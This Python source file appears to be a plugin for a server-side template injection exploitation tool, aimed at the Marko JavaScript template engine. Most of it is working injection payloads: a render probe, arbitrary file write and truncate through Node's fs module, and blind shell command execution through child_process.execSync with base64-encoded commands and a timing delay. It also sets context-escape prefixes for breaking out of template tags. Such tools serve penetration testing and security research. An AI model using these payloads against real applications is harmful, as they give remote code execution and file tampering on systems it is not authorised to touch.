from utils.strings import quote
from plugins.languages import javascript
from utils.loggers import log
from utils import rand
import base64
import re

class Marko(javascript.Javascript):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '${%(code)s}',
                'header': '${"%(header)s"}',
                'trailer': '${"%(trailer)s"}',
            },
            'write' : {
                'call' : 'inject',
                'write' : """${require('fs').appendFileSync('%(path)s',Buffer('%(chunk_b64)s','base64'),'binary')}""",
                'truncate' : """${require('fs').writeFileSync('%(path)s','')}"""
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """${require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')}"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },
            
            { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '${"1"', 'closures' : javascript.ctx_closures },

            # If escapes require to know the ending tag e.g. <div if(%s)></div>
            
            # This to escape from <var name=data/> and <assign name=data/>
            { 'level': 2, 'prefix': '1/>', 'suffix' : '' },
            
        ])
